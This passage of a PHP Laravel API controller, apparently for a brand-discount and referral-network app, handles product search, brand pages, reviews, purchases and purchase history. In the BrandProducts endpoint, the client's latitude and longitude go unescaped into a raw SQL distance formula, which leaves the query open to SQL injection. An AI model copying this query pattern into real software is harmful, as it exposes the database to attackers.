                $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
                if (!count($BrandProductGallery)) {
                    $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
                }
                foreach ($BrandProductGallery as $Gallery) {
                    if ($Gallery->BrandProductType == "IMAGE") {
                        $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                    }
                }
                $Product->BrandProductGallery = $BrandProductGallery;
            }
            $BrandProducts = $BrandProducts->pluck("IDBrandProduct")->toArray();
        } else {
            $BrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->leftjoin("branches", "branches.IDBrand", "brands.IDBrand")->leftjoin("areas", "areas.IDArea", "branches.IDArea");
            $BrandProducts = $BrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("branches.BranchStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
            if ($IDBrand) {
                $BrandProducts = $BrandProducts->where("brandproducts.IDBrand", $IDBrand);
            }
            if ($BrandRating) {
                $BrandProducts = $BrandProducts->where("brands.BrandRating", $BrandRating);
            }
            if ($IDCity) {
                $BrandProducts = $BrandProducts->whereIn("areas.IDCity", $IDCity);
            }
            if ($IDArea) {
                $BrandProducts = $BrandProducts->whereIn("branches.IDArea", $IDArea);
            }
            if ($IDCategory) {
                $BrandProducts = $BrandProducts->whereIn("subcategories.IDCategory", $IDCategory);
            }
            if ($IDSubCategory) {
                $BrandProducts = $BrandProducts->whereIn("brandproducts.IDSubCategory", $IDSubCategory);
            }
            if ($BrandProductDiscountType) {
                $BrandProducts = $BrandProducts->where("brandproducts.BrandProductDiscountType", $BrandProductDiscountType);
            }
            if ($SearchKey) {
                $BrandProducts = $BrandProducts->where(function ($query) use ($SearchKey) {
                    $query->where('BrandProductTitleEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductTitleAr', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescAr', 'like', '%' . $SearchKey . '%');
                });
            }
            $BrandProducts = $BrandProducts->select("brandproducts.IDBrandProduct", "brandproducts.IDSubCategory", "brandproducts.IDBrand", "brandproducts.BrandProductTitleEn", "brandproducts.BrandProductTitleAr", "brandproducts.BrandProductDescEn", "brandproducts.BrandProductDescAr", "brandproducts.BrandProductPrice", "brandproducts.BrandProductDiscount", "brandproducts.BrandProductDiscountType", "brandproducts.BrandProductPoints", "brandproducts.BrandProductReferralPoints", "brandproducts.BrandProductUplinePoints", "brandproducts.BrandProductStatus", "brandproducts.BrandProductStartDate", "brandproducts.BrandProductEndDate", "brandproducts.created_at", "brands.BrandNameEn", "brands.BrandNameAr", "brands.BrandLogo", "brands.BrandRating", "subcategories.SubCategoryNameEn", "subcategories.SubCategoryNameAr");
            $BrandProducts = $BrandProducts->groupby("brandproducts.IDBrandProduct")->orderby("brandproducts." . $OrderBy, "DESC")->get();
            foreach ($BrandProducts as $Product) {
                $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
                if (!count($BrandProductGallery)) {
                    $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
                }
                foreach ($BrandProductGallery as $Gallery) {
                    if ($Gallery->BrandProductType == "IMAGE") {
                        $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                    }
                }
                $Product->BrandProductGallery = $BrandProductGallery;
            }
            $BrandProducts = $BrandProducts->pluck("IDBrand")->toArray();
        }

        $Brands = Brand::where("BrandStatus", "ACTIVE")->whereIn("IDBrand", $BrandProducts)->orderby("IDBrand", "DESC")->get();
        $Brands = BrandResource::collection($Brands);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Brands
        );
        return $Response;
    }

    public function Categories(Request $request)
    {
        $Categories = Category::where("CategoryActive", 1)->where("CategoryType", "PROJECT")->get();
        $Categories = CategoryResource::collection($Categories);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Categories
        );
        return $Response;
    }

    public function SubCategories(Request $request)
    {
        $IDCategory = $request->IDCategory;

        $query = SubCategory::where("SubCategoryActive", 1)
            ->leftJoin("categories", "categories.IDCategory", "=", "subcategories.IDCategory")
            ->where("categories.CategoryType", "PROJECT")
            ->select('subcategories.*', 'categories.*');

        if ($IDCategory) {
            $query = $query->where("subcategories.IDCategory", $IDCategory);
        }

        $SubCategories = $query->get();
        $SubCategories = SubCategoryResource::collection($SubCategories);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $SubCategories
        );
        return $Response;
    }

    public function BrandProducts(Request $request)
    {
        $Client = auth('client')->user();
        $SearchKey = $request->SearchKey;
        $IDBrand = $request->IDBrand;
        $IDCity = $request->IDCity;
        $IDArea = $request->IDArea;
        $IDCategory = $request->IDCategory;
        $IDSubCategory = $request->IDSubCategory;
        $BrandProductDiscountType = $request->BrandProductDiscountType;
        $BrandProductPoints = $request->BrandProductPoints;
        $ClientLatitude = $request->ClientLatitude;
        $ClientLongitude = $request->ClientLongitude;
        $OrderBy = "IDBrandProduct";
        if ($BrandProductPoints) {
            $OrderBy = "BrandProductPoints";
        }

        $Today = new DateTime('now');
        $Today = $Today->format('Y-m-d H:i:s');

        if ($ClientLatitude && $ClientLongitude) {
            $NearestBrandProductRadius = GeneralSettings('NearestBrandProductRadius');
            $NearestBrandProductRadius = $NearestBrandProductRadius / 1000;

            $BrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->leftjoin("branches", "branches.IDBrand", "brands.IDBrand")->leftjoin("areas", "areas.IDArea", "branches.IDArea");
            $BrandProducts = $BrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("branches.BranchStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
            if ($IDBrand) {
                $BrandProducts = $BrandProducts->where("brandproducts.IDBrand", $IDBrand);
            }
            if ($IDCity) {
                $BrandProducts = $BrandProducts->whereIn("areas.IDCity", $IDCity);
            }
            if ($IDArea) {
                $BrandProducts = $BrandProducts->whereIn("branches.IDArea", $IDArea);
            }
            if ($IDCategory) {
                $BrandProducts = $BrandProducts->whereIn("subcategories.IDCategory", $IDCategory);
            }
            if ($IDSubCategory) {
                $BrandProducts = $BrandProducts->whereIn("brandproducts.IDSubCategory", $IDSubCategory);
            }
            if ($BrandProductDiscountType) {
                $BrandProducts = $BrandProducts->where("brandproducts.BrandProductDiscountType", $BrandProductDiscountType);
            }
            if ($SearchKey) {
                $BrandProducts = $BrandProducts->where(function ($query) use ($SearchKey) {
                    $query->where('BrandProductTitleEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductTitleAr', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescAr', 'like', '%' . $SearchKey . '%');
                });
            }
            $BrandProducts = $BrandProducts->groupby("brandproducts.IDBrandProduct")->orderBy('Distance')->orderby("brandproducts." . $OrderBy, "DESC")->select(DB::raw('brandproducts.IDBrandProduct,brandproducts.IDSubCategory,brandproducts.IDBrand,brandproducts.BrandProductTitleEn,brandproducts.BrandProductTitleAr,brandproducts.BrandProductDescEn,brandproducts.BrandProductDescAr,brandproducts.BrandProductPrice,brandproducts.BrandProductDiscount,brandproducts.BrandProductDiscountType,brandproducts.BrandProductPoints,brandproducts.BrandProductReferralPoints,brandproducts.BrandProductUplinePoints,brandproducts.BrandProductStatus,brandproducts.BrandProductStartDate,brandproducts.BrandProductEndDate,brandproducts.created_at,brands.BrandNameEn,brands.BrandNameAr,brands.BrandLogo,brands.BrandRating,subcategories.SubCategoryNameEn,subcategories.SubCategoryNameAr, ( 6367 * acos( cos( radians(' . $ClientLatitude . ') ) * cos( radians( branches.BranchLatitude ) ) * cos( radians( branches.BranchLongitude ) - radians(' . $ClientLongitude . ') ) + sin( radians(' . $ClientLatitude . ') ) * sin( radians( branches.BranchLatitude ) ) ) )  AS Distance '))->havingRaw('Distance < ' . $NearestBrandProductRadius)->get();
            foreach ($BrandProducts as $Product) {
                $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
                if (!count($BrandProductGallery)) {
                    $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
                }
                foreach ($BrandProductGallery as $Gallery) {
                    if ($Gallery->BrandProductType == "IMAGE") {
                        $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                    }
                }
                $Product->BrandProductGallery = $BrandProductGallery;
                $Product->ProductBranches = ProductBranches($Product->IDBrandProduct, $Client, "PRODUCT");
            }
            $BrandProducts = BrandProductResource::collection($BrandProducts);
        } else {
            $BrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->leftjoin("branches", "branches.IDBrand", "brands.IDBrand")->leftjoin("areas", "areas.IDArea", "branches.IDArea");
            $BrandProducts = $BrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("branches.BranchStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
            if ($IDBrand) {
                $BrandProducts = $BrandProducts->where("brandproducts.IDBrand", $IDBrand);
            }
            if ($IDCity) {
                $BrandProducts = $BrandProducts->whereIn("areas.IDCity", $IDCity);
            }
            if ($IDArea) {
                $BrandProducts = $BrandProducts->whereIn("branches.IDArea", $IDArea);
            }
            if ($IDCategory) {
                $BrandProducts = $BrandProducts->whereIn("subcategories.IDCategory", $IDCategory);
            }
            if ($IDSubCategory) {
                $BrandProducts = $BrandProducts->whereIn("brandproducts.IDSubCategory", $IDSubCategory);
            }
            if ($BrandProductDiscountType) {
                $BrandProducts = $BrandProducts->where("brandproducts.BrandProductDiscountType", $BrandProductDiscountType);
            }
            if ($SearchKey) {
                $BrandProducts = $BrandProducts->where(function ($query) use ($SearchKey) {
                    $query->where('BrandProductTitleEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductTitleAr', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescAr', 'like', '%' . $SearchKey . '%');
                });
            }
            $BrandProducts = $BrandProducts->select("brandproducts.IDBrandProduct", "brandproducts.IDSubCategory", "brandproducts.IDBrand", "brandproducts.BrandProductTitleEn", "brandproducts.BrandProductTitleAr", "brandproducts.BrandProductDescEn", "brandproducts.BrandProductDescAr", "brandproducts.BrandProductPrice", "brandproducts.BrandProductDiscount", "brandproducts.BrandProductDiscountType", "brandproducts.BrandProductPoints", "brandproducts.BrandProductReferralPoints", "brandproducts.BrandProductUplinePoints", "brandproducts.BrandProductStatus", "brandproducts.BrandProductStartDate", "brandproducts.BrandProductEndDate", "brandproducts.created_at", "brands.BrandNameEn", "brands.BrandNameAr", "brands.BrandLogo", "brands.BrandRating", "subcategories.SubCategoryNameEn", "subcategories.SubCategoryNameAr");
            $BrandProducts = $BrandProducts->groupby("brandproducts.IDBrandProduct")->orderby("brandproducts." . $OrderBy, "DESC")->get();
            foreach ($BrandProducts as $Product) {
                $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
                if (!count($BrandProductGallery)) {
                    $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
                }
                foreach ($BrandProductGallery as $Gallery) {
                    if ($Gallery->BrandProductType == "IMAGE") {
                        $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                    }
                }
                $Product->BrandProductGallery = $BrandProductGallery;
                $Product->ProductBranches = ProductBranches($Product->IDBrandProduct, $Client, "PRODUCT");
            }
            $BrandProducts = BrandProductResource::collection($BrandProducts);
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $BrandProducts
        );
        return $Response;
    }

    public function BrandPage($IDBrand)
    {
        $Client = auth('client')->user();
        $Today = new DateTime('now');
        $Today = $Today->format('Y-m-d H:i:s');
        $Brand = Brand::find($IDBrand);
        if (!$Brand) {
            return RespondWithBadRequest(1);
        }

        $Brand->Branches = ProductBranches($IDBrand, $Client, "BRAND");

        $BrandSocialMedia = BrandSocialMedia::leftjoin("socialmedia", "socialmedia.IDSocialMedia", "brandsocialmedia.IDSocialMedia")->where("brandsocialmedia.IDBrand", $IDBrand)->where("brandsocialmedia.BrandSocialMediaLinked", 1)->get();
        $BrandSocialMedia = BrandSocialMediaResource::collection($BrandSocialMedia);
        $Brand->BrandSocialMedia = $BrandSocialMedia;

        $BrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand");
        $BrandProducts = $BrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
        $BrandProducts = $BrandProducts->select("brandproducts.IDBrandProduct", "brandproducts.IDSubCategory", "brandproducts.IDBrand", "brandproducts.BrandProductTitleEn", "brandproducts.BrandProductTitleAr", "brandproducts.BrandProductDescEn", "brandproducts.BrandProductDescAr", "brandproducts.BrandProductPrice", "brandproducts.BrandProductDiscount", "brandproducts.BrandProductDiscountType", "brandproducts.BrandProductPoints", "brandproducts.BrandProductReferralPoints", "brandproducts.BrandProductUplinePoints", "brandproducts.BrandProductStatus", "brandproducts.BrandProductStartDate", "brandproducts.BrandProductEndDate", "brandproducts.created_at", "brands.BrandNameEn", "brands.BrandNameAr", "brands.BrandLogo", "brands.BrandRating", "subcategories.SubCategoryNameEn", "subcategories.SubCategoryNameAr")->orderby("brandproducts.IDBrandProduct", "DESC")->get();
        foreach ($BrandProducts as $Product) {
            $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
            if (!count($BrandProductGallery)) {
                $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
            }
            foreach ($BrandProductGallery as $Gallery) {
                if ($Gallery->BrandProductType == "IMAGE") {
                    $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                }
            }
            $Product->BrandProductGallery = $BrandProductGallery;
            $Product->ProductBranches = ProductBranches($Product->IDBrandProduct, $Client, "PRODUCT");
        }
        $BrandProducts = BrandProductResource::collection($BrandProducts);
        $Brand->BrandProducts = $BrandProducts;

        $BrandReviews = BrandRating::leftjoin("clients", "clients.IDClient", "brandratings.IDClient")->where("brandratings.IDBrand", $IDBrand)->where("brandratings.BrandRatingStatus", "SHOW")->orderby("brandratings.IDBrandRating", "DESC")->select("clients.ClientName", "clients.ClientPicture", "brandratings.BrandRating", "brandratings.BrandReview", "brandratings.created_at")->get();
        $BrandReviews = BrandRatingResource::collection($BrandReviews);
        $Brand->BrandReviews = $BrandReviews;

        $BrandGallery = BrandGallery::where("IDBrand", $IDBrand)->where("BrandGalleryDeleted", 0)->get();
        foreach ($BrandGallery as $Gallery) {
            if ($Gallery->BrandGalleryType == "IMAGE") {
                $Gallery->BrandGalleryPath = ($Gallery->BrandGalleryPath) ? asset($Gallery->BrandGalleryPath) : '';
            }
        }
        $Brand->BrandGallery = $BrandGallery;

        $Brand = BrandPageResource::collection([$Brand])[0];


        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Brand
        );
        return $Response;
    }

    public function Shopping()
    {
        $ShoppingApp = GeneralSettings('ShoppingApp');

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $ShoppingApp
        );
        return $Response;
    }

    public function AddBrandReview(Request $request)
    {
        $Client = auth('client')->user();
        $IDBrand = $request->IDBrand;
        $Rating = $request->Rating;
        $Review = $request->Review;
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        if (!$Rating) {
            return RespondWithBadRequest(1);
        }

        $BrandRating = new BrandRating;
        $BrandRating->IDClient = $Client->IDClient;
        $BrandRating->IDBrand = $IDBrand;
        $BrandRating->BrandRating = $Rating;
        $BrandRating->BrandReview = $Review;
        $BrandRating->save();

        $BrandRatings = BrandRating::where("IDBrand", $IDBrand);
        $RatingSum = $BrandRatings->sum("BrandRating");
        $RatingCount = $BrandRatings->count();

        $Brand = Brand::find($IDBrand);
        $Brand->BrandRating = $RatingSum / $RatingCount;
        $Brand->save();

        return RespondWithSuccessRequest(8);
    }

    public function BuyBrandProduct(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        if ($Client->ClientStatus == "INACTIVE") {
            return RespondWithBadRequest(64);
        }

        $Today = new DateTime('now');
        $Today = $Today->format('Y-m-d H:i:s');

        $IDBrandProduct = $request->IDBrandProduct;
        $IDPaymentMethod = $request->IDPaymentMethod;
        $BrandProduct = BrandProduct::where("IDBrandProduct", $IDBrandProduct)->where("BrandProductStatus", "ACTIVE")->where("BrandProductStartDate", "<=", $Today)->where("BrandProductEndDate", ">", $Today)->first();
        if (!$BrandProduct) {
            return RespondWithBadRequest(1);
        }

        $now = Carbon::now();
        $last24Hours = $now->subDay();

        $ClientBrandProductBefore24 = ClientBrandProduct::where('UsedAt', '>=', $last24Hours)
            ->where("ClientBrandProductStatus", "USED")
            ->where("IDBrandProduct", $IDBrandProduct)
            ->where("IDClient", $Client->IDClient)
            ->get();

        if (count($ClientBrandProductBefore24) == 2) {
            return RespondWithBadRequest(56);
        }
        if ($BrandProduct->BrandProductDiscountType === "PERCENT") {
            $Amount = $BrandProduct->BrandProductPrice - ($BrandProduct->BrandProductPrice * $BrandProduct->BrandProductDiscount / 100);
        } else if ($BrandProduct->BrandProductDiscountType === "VALUE") {
            $Amount = $BrandProduct->BrandProductPrice - $BrandProduct->BrandProductDiscount;
        } else if ($BrandProduct->BrandProductDiscountType === "INVOICE") {
            $Amount = 0;
        };

        $RandomNum = mt_rand(1000, 9999);
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $ClientBrandProductSerial = $RandomNum . $Time;

        $ClientBrandProduct = new ClientBrandProduct;
        $ClientBrandProduct->IDClient = $Client->IDClient;

        $Brand = Brand::where("IDBrand", $BrandProduct->IDBrand)->where("BrandStatus", "ACTIVE")->first();
        if (!$Brand) {
            return RespondWithBadRequest(10);
        }
        $ClientBrandProduct->IDUser = $Brand->IDUser;
        $ClientBrandProduct->IDBrandProduct = $IDBrandProduct;
        if ($BrandProduct->BrandProductDiscountType == "INVOICE") {
            $ClientBrandProduct->ProductPrice = 0;
            $ClientBrandProduct->ProductDiscount = 0;
            $ClientBrandProduct->ProductTotalAmount = 0;
        } else {
            $ClientBrandProduct->ProductTotalAmount = $Amount;
            $ClientBrandProduct->ProductPrice = $BrandProduct->BrandProductPrice;
            $ClientBrandProduct->ProductDiscount = $BrandProduct->BrandProductPrice - $Amount;
        }

        if ($IDPaymentMethod == 1) {
            $ClientBrandProduct->ClientBrandProductStatus = "PENDING";
        }
        $ClientBrandProduct->ClientBrandProductSerial = $ClientBrandProductSerial;
        // return $ClientBrandProduct;

        $ClientBrandProduct->save();

        $BatchNumber = "#BP" . $ClientBrandProduct->IDClientBrandProduct;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        if ($IDPaymentMethod == 1) {
            $Amount = 0;
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $ClientBrandProductSerial
        );
        return $Response;
    }

    public function MyBrandProducts(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        $ClientBrandProductStatus = $request->ClientBrandProductStatus;
        $StartDate = $request->StartDate;
        $EndDate = $request->EndDate;
        $SubCategories = $request->SubCategories;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $ClientBrandProducts = ClientBrandProduct::leftjoin("brandproducts", "brandproducts.IDBrandProduct", "clientbrandproducts.IDBrandProduct")->leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->where("clientbrandproducts.IDClient", $Client->IDClient)->where('clientbrandproducts.ClientBrandProductStatus', 'USED');
        if ($ClientBrandProductStatus) {
            $ClientBrandProducts = $ClientBrandProducts->where("clientbrandproducts.ClientBrandProductStatus", $ClientBrandProductStatus);
        }
        if ($StartDate) {
            $ClientBrandProducts = $ClientBrandProducts->where("clientbrandproducts.created_at", ">=", $StartDate);
        }
        if ($EndDate) {
            $ClientBrandProducts = $ClientBrandProducts->where("clientbrandproducts.created_at", "<=", $EndDate);
        }
        if ($SubCategories && count($SubCategories)) {
            $ClientBrandProducts = $ClientBrandProducts->whereIn("brandproducts.IDSubCategory", $SubCategories);
        }
        $ClientBrandProducts = $ClientBrandProducts->select("clientbrandproducts.IDClientBrandProduct", "brandproducts.IDSubCategory", "clientbrandproducts.ClientBrandProductSerial", "clientbrandproducts.ClientBrandProductStatus", "clientbrandproducts.created_at", "clientbrandproducts.updated_at", "brandproducts.IDBrandProduct", "brandproducts.IDBrand", "brandproducts.BrandProductTitleEn", "brandproducts.BrandProductTitleAr", "brandproducts.BrandProductDescEn", "brandproducts.BrandProductDescAr", "brandproducts.BrandProductPrice", "brandproducts.BrandProductDiscount", "brandproducts.BrandProductDiscountType", "brandproducts.BrandProductPoints", "brandproducts.BrandProductReferralPoints", "brandproducts.BrandProductUplinePoints", "brandproducts.BrandProductStatus", "brandproducts.BrandProductStartDate", "brandproducts.BrandProductEndDate", "brandproducts.created_at", "brands.BrandNameEn", "brands.BrandNameAr", "brands.BrandLogo", "brands.BrandRating", "subcategories.SubCategoryNameEn", "subcategories.SubCategoryNameAr");

        $Pages = ceil($ClientBrandProducts->count() / 20);
        $ClientBrandProducts = $ClientBrandProducts->orderby("clientbrandproducts.IDClientBrandProduct", "DESC")->skip($IDPage)->take(20)->get();

        foreach ($ClientBrandProducts as $Product) {
            $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
            if (!count($BrandProductGallery)) {
                $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
            }
            foreach ($BrandProductGallery as $Gallery) {
                if ($Gallery->BrandProductType == "IMAGE") {
                    $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                }
            }
            $Product->BrandProductGallery = $BrandProductGallery;
        }

        $MyProducts = ClientBrandProductResource::collection($ClientBrandProducts);

        $UsedCategory = "";
        $ClientBrandProducts = ClientBrandProduct::leftjoin("brandproducts", "brandproducts.IDBrandProduct", "clientbrandproducts.IDBrandProduct")->where("clientbrandproducts.IDClient", $Client->IDClient);
        if ($StartDate) {
            $ClientBrandProducts = $ClientBrandProducts->where("clientbrandproducts.created_at", ">=", $StartDate);
        }
        if ($EndDate) {
            $ClientBrandProducts = $ClientBrandProducts->where("clientbrandproducts.created_at", "<=", $EndDate);
        }
        if ($SubCategories && count($SubCategories)) {
            $ClientBrandProducts = $ClientBrandProducts->whereIn("brandproducts.IDSubCategory", $SubCategories);
        }
        $ClientBrandProducts = $ClientBrandProducts->whereIn("clientbrandproducts.ClientBrandProductStatus", ["USED"]);
        $PointsEarned = $ClientBrandProducts->sum("brandproducts.BrandProductPoints");
        $MoneySaved = $ClientBrandProducts->sum("clientbrandproducts.ProductDiscount");
        $UsedProducts = (clone $ClientBrandProducts)->where("clientbrandproducts.ClientBrandProductStatus", "USED")->count("clientbrandproducts.IDClientBrandProduct");
        $SubCategory = $ClientBrandProducts->select('brandproducts.IDSubCategory', DB::raw('count(*) as Total'))->groupby("brandproducts.IDSubCategory")->orderby("Total", "DESC")->first();
        if ($SubCategory) {
            $SubCategory = SubCategory::find($SubCategory->IDSubCategory);
            $ClientLanguage = LocalAppLanguage($Client->ClientAppLanguage);
            $SubCategoryName = "SubCategoryName" . $ClientLanguage;
            $UsedCategory = $SubCategory->$SubCategoryName;
        }

        $Response = array("MoneySaved" => $MoneySaved, "PointsEarned" => $PointsEarned, "UsedProducts" => $UsedProducts, "UsedCategory" => $UsedCategory, "ClientBrandProducts" => $MyProducts, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function BrandContactUs(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $BrandName = $request->BrandName;
        $ClientName = $request->ClientName;
        $Phone = $request->Phone;
        $Email = $request->Email;
        $City = $request->City;
        $Area = $request->Area;
        $Address = $request->Address;
        $Category = $request->Category;
        $Latitude = $request->Latitude;
        $Longitude = $request->Longitude;
        $Message = $request->Message;

        if (!$BrandName) {
            return RespondWithBadRequest(1);
        }
        if (!$ClientName) {
            return RespondWithBadRequest(1);
        }
        if (!$Phone) {
            return RespondWithBadRequest(1);
        }

        $BrandContactUs = new BrandContactUs;
        $BrandContactUs->BrandName = $BrandName;
        $BrandContactUs->ClientName = $ClientName;
        $BrandContactUs->Phone = $Phone;
        $BrandContactUs->Email = $Email;
        $BrandContactUs->City = $City;
        $BrandContactUs->Area = $Area;
        $BrandContactUs->Address = $Address;
        $BrandContactUs->Category = $Category;
        $BrandContactUs->Latitude = $Latitude;
        $BrandContactUs->Longitude = $Longitude;
        $BrandContactUs->Message = $Message;
        $BrandContactUs->save();

        return RespondWithSuccessRequest(8);
    }

    public function ClientNetwork(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDParentClient = $request->IDParentClient;
        $AgencyNumber = $request->AgencyNumber;
        if (!$IDParentClient) {
            return RespondWithBadRequest(1);
        }
        if (!$AgencyNumber) {
            $AgencyNumber = 1;
        }

        $ParentNetwork = PlanNetwork::leftjoin("clients as c1", "c1.IDClient", "plannetwork.IDClient")->leftjoin("clients as c2", "c2.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.IDClient", $IDParentClient)->select("plannetwork.IDPlanNetwork", "plannetwork.PlanNetworkPosition", "c1.IDClient", "c1.IDPosition", "c1.ClientName", "c1.ClientPhone", "c1.ClientAppID", "c1.ClientPrivacy", "c1.ClientPicture", "c1.ClientLeftPoints", "c1.ClientRightPoints", "c2.ClientName as ReferralName")->first();
        if (!$ParentNetwork) {
            return RespondWithBadRequest(1);
        }

        $ClientLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        $PositionLanguageName = "PositionTitle" . $ClientLanguage;
        $Position = Position::find($Client->IDPosition);
        $PositionName = "Networker";
        if ($Position) {
            $PositionName = $Position->$PositionLanguageName;
        }

        $PlanNetworkAgencies = PlanNetworkAgency::where("IDPlanNetwork", $ParentNetwork->IDPlanNetwork)->get();

        $ParentNetwork->PositionName = $PositionName;
